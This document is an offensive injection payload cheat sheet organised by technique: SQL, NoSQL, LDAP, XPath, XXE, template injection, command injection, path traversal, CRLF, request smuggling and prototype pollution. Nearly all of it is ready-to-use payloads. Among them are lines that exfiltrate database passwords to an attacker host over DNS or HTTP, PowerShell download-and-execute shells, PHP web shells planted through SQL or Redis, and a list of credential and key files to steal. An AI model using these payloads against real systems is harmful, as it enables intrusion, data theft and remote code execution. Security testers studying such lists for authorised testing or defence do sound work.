# DEVIL'S DEN — INJECTION PAYLOAD ARSENAL v1.0
# SQL, NoSQL, LDAP, XPath, XXE, SSTI, CMDi, Path Traversal, CRLF, HTTP Smuggling

## SQL INJECTION DETECTION PROBES
```
'
''
`)
'))
'--
'-- -
'#
' OR 1=1--
" OR "1"="1
1' ORDER BY 1--
1' ORDER BY 9999--
1 AND 1=2
' WAITFOR DELAY '0:0:5'--
'; SELECT SLEEP(5)--
' AND SLEEP(5)--
' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--
```

## MySQL TIME-BASED BLIND
```
' AND SLEEP(5)--
'; SELECT SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
' AND BENCHMARK(5000000,SHA1(1))--
' RLIKE SLEEP(5)--
' OR SLEEP(5)--
1 AND SLEEP(5)
```

## MSSQL TIME-BASED BLIND
```
'; WAITFOR DELAY '0:0:5'--
1'; WAITFOR DELAY '0:0:5'--
' IF(1=1) WAITFOR DELAY '0:0:5'--
'; EXEC xp_cmdshell('ping attacker.interactsh.io')--
'; EXEC master..xp_cmdshell('nslookup attacker.interactsh.io')--
```

## PostgreSQL TIME-BASED BLIND
```
'; SELECT pg_sleep(5)--
' AND 1=(SELECT 1 FROM pg_sleep(5))--
' OR pg_sleep(5)--
' AND 1=CAST((SELECT pg_sleep(5)) AS int)--
```

## Oracle TIME-BASED BLIND
```
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual--
' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

## UNION-BASED EXTRACTION (MySQL)
```
' ORDER BY 1,2,3,4,5--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,@@hostname,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,GROUP_CONCAT(table_name SEPARATOR ','),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users--
' UNION SELECT 1,@@global.secure_file_priv,3--
```

## ERROR-BASED EXTRACTION (MySQL)
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))--
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
' AND updatexml(1,concat(0x7e,version()),1)--
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

## ERROR-BASED EXTRACTION (MSSQL)
```
' AND 1=CONVERT(int,@@version)--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
'; SELECT TOP 1 * INTO #tmp FROM users--
' UNION SELECT 1,CONVERT(int,@@version),3--
```

## BOOLEAN BLIND
```
' AND (SELECT SUBSTRING(version(),1,1))='5'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>90--
' AND ASCII(SUBSTRING((SELECT database()),1,1))=115--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

## OOB DNS EXFILTRATION
```
# MySQL:
' UNION SELECT LOAD_FILE(concat('\\\\',version(),'.attacker.interactsh.io\\a'))--
' AND (SELECT LOAD_FILE(concat(0x5c5c5c5c,(SELECT password FROM users LIMIT 1),'.attacker.interactsh.io\\a')))--
' INTO OUTFILE '/var/www/html/shell.php' FIELDS TERMINATED BY '<?php system($_GET[0]); ?>'--

# MSSQL:
'; EXEC master..xp_dirtree '//'+@@version+'.attacker.interactsh.io/a'--
'; DECLARE @v varchar(max); SET @v=(SELECT TOP 1 password FROM users); EXEC master..xp_dirtree '//'+@v+'.attacker.interactsh.io/a'--

# Oracle:
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.interactsh.io/?d='||version) FROM dual--
```

## MSSQL RCE VIA xp_cmdshell
```
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('net user')--
'; EXEC xp_cmdshell('nslookup attacker.interactsh.io')--
'; EXEC xp_cmdshell('powershell -c "iex(new-object net.webclient).downloadstring(''http://attacker.interactsh.io/shell.ps1'')"')--
'; sp_configure 'show advanced options',1; RECONFIGURE; sp_configure 'xp_cmdshell',1; RECONFIGURE--
```

## SECOND-ORDER SQLi
```
# Register username: admin'--
# Use in: SELECT * FROM users WHERE username='admin'--'
# Payloads to try as stored values:
admin'--
' UNION SELECT 1,2,3--
1' AND 1=1--
' OR ''='
```

## WAF BYPASS SQLI
```
SeLeCt 1,2,3
SE/**/LECT 1,2,3
/*!SELECT*/ 1,2,3
/*!50000SELECT*/ 1,2,3
%53%45%4c%45%43%54 1,2,3
HAVING 1=1--
' OR 1 LIKE 1--
'%09OR%091=1--
' OR 2>1--
' OR 'x'='x
'||'1'='1
1 IN(1)--
'+OR+1=1--
' OR/**/1=1--
```

## NOSQL INJECTION — MongoDB
```
# JSON Auth Bypass:
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
{"username": {"$in": ["admin","administrator"]}, "password": {"$exists": true}}
{"username": "admin", "password": {"$regex": ".*"}}
{"username": {"$regex": "^adm"}, "password": {"$gt": ""}}

# URL Parameter Auth Bypass:
?username[$gt]=&password[$gt]=
?username[$ne]=invalid&password[$ne]=invalid
?username[$regex]=^admin&password[$exists]=true
?username=admin&password[$ne]=wrongpassword
?username[$in][]=admin&username[$in][]=administrator&password[$gt]=

# $where JavaScript Injection:
{"$where": "this.username == 'admin'"}
{"$where": "function() { return true; }"}
{"$where": "function() { var d=new Date(); do{var c=new Date();}while(c-d<5000); return true; }"}
{"$where": "return (this.username == 'admin' && this.password.match(/^p.*/))"}
```

## NOSQL — Redis Command Injection
```
KEYS *
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET malicious "<?php system($_GET['cmd']); ?>"
SAVE
CONFIG SET requirepass ""
SLAVEOF attacker.interactsh.io 6379
```

## LDAP INJECTION
```
*
*()|&'
*)(uid=*))(|(uid=*
admin)(&
admin)(|(password=*
*)(objectClass=*
)(|(cn=*
*))%00
*)(mail=*
*))(|(objectclass=*
' OR 1=1
```

## XPATH INJECTION
```
' or '1'='1
' or ''='
x' or name()='username' or 'x'='y
' or 1=1 or ''='
admin' or 1=1 or ''='
' or true() or ''='
' and false() or ''='
' and substring(name(/*[1]),1,1)='a' or ''='
```

## XXE — FILE READ
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

## XXE — SSRF
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

## XXE — BLIND OOB (evil.dtd on attacker server)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.interactsh.io/evil.dtd">
  %xxe;
]>
<root></root>
```
evil.dtd content:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.interactsh.io/?d=%file;'>">
%eval;
%exfil;
```

## XXE — SVG FILE UPLOAD
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
```

## XINCLUDE ATTACK (DOCTYPE blocked)
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

## SSTI DETECTION — UNIVERSAL
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}
${7*'7'}
{7*7}
[[7*7]]
{{config}}
{{settings.SECRET_KEY}}
{{request.environ}}
${T(java.lang.Runtime).getRuntime().exec('id')}
${"freemarker.template.utility.Execute"?new()("id")}
```

## SSTI — Jinja2 RCE (Python)
```python
{{''.__class__.__mro__[1].__subclasses__()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request.__class__.__mro__[8].__subclasses__()[40].__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}
```

## SSTI — Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id','>/tmp/x']|sort('exec')}}
```

## SSTI — Freemarker (Java)
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
```

## SSTI — ERB (Ruby)
```
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read() %>
<% require 'open3'; stdout,_=Open3.capture2('id'); %>
```

## COMMAND INJECTION — ALL SEPARATORS
```
; id
| id
|| id
& id
&& id
`id`
$(id)
;id
|id
; whoami
| whoami
; cat /etc/passwd
| cat /etc/passwd
$(cat /etc/passwd)
; ls -la /
; sleep 5
| sleep 5
; ping -c 5 127.0.0.1
; nslookup $(whoami).attacker.interactsh.io
$(nslookup $(id).attacker.interactsh.io)
; curl http://attacker.interactsh.io/?c=$(id|base64)
; wget -q http://attacker.interactsh.io/?c=$(id|base64)
```

## COMMAND INJECTION — FILTER BYPASSES
```
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
{cat,/etc/passwd}
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/???/c?t /etc/passwd
/???/??t /etc/???swd
l$()s
ls${IFS}-la
id;ls
{id,ls}
$((`expr 1`))
```

## COMMAND INJECTION — WINDOWS
```
& whoami
| whoami
&& whoami
|| whoami
cmd /c whoami
cmd.exe /c whoami
powershell -c whoami
%COMSPEC% /c whoami
& ping -n 5 127.0.0.1
& nslookup attacker.interactsh.io
& certutil -urlcache -f http://attacker.interactsh.io/x x
& powershell -c "iex(iwr -uri 'http://attacker.interactsh.io/shell.ps1' -usebasicparsing)"
```

## PATH TRAVERSAL — LINUX
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
../../../../../../../../../etc/passwd
../../../../../../../../../../etc/passwd
```

## PATH TRAVERSAL — ENCODED
```
..%2fetc%2fpasswd
..%252fetc%252fpasswd
..%c0%afetc%c0%afpasswd
%2e%2e%2fetc%2fpasswd
..%ef%bc%8fetc%ef%bc%8fpasswd
....//etc/passwd
....\/etc/passwd
..././etc/passwd
..%00/etc/passwd
..\etc\passwd
```

## PATH TRAVERSAL — HIGH-VALUE TARGETS
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/ssh/ssh_host_rsa_key
/root/.ssh/id_rsa
/home/ubuntu/.ssh/id_rsa
~/.bash_history
/proc/self/environ
/proc/self/cmdline
/proc/version
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/auth.log
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/var/www/html/.env
/app/.env
/.aws/credentials
/root/.aws/credentials
/run/secrets/kubernetes.io/serviceaccount/token
/etc/kubernetes/admin.conf
/.docker/config.json
/var/run/docker.sock
```

## PATH TRAVERSAL — WINDOWS
```
..\..\windows\win.ini
..\..\..\windows\win.ini
..%5c..%5cwindows%5cwin.ini
..%255c..%255cwindows%255cwin.ini
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
\\127.0.0.1\c$\windows\win.ini
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
```

## CRLF INJECTION
```
%0d%0aSet-Cookie:%20malicious=true
%0d%0aLocation:%20https://evil.com
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
\r\nSet-Cookie: malicious=true
\r\nLocation: https://evil.com
%0aUser: attacker
%0d%0aX-Injected-Header: evil
```

## HTTP REQUEST SMUGGLING
```
# CL.TE:
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

# TE.TE Obfuscation:
Transfer-Encoding: xchunked
Transfer-Encoding: chunked, identity
Transfer-Encoding:  chunked
Transfer-Encoding: CHUNKED
Transfer-Encoding: x-custom, chunked
X-Transfer-Encoding: chunked
```

## PROTOTYPE POLLUTION
```
?__proto__[admin]=true
?__proto__[isAdmin]=true
?constructor.prototype.admin=true
?constructor[prototype][admin]=true
?__proto__[outputFunctionName]=x;process.mainModule.require('child_process').exec('id')//

# JSON body:
{"__proto__": {"admin": true}}
{"__proto__": {"isAdmin": true, "role": "admin"}}
{"constructor": {"prototype": {"admin": true}}}

# PP to RCE via ejs:
{"__proto__": {"view options": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');//"}}}

# PP to XSS via client-side gadget:
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
```
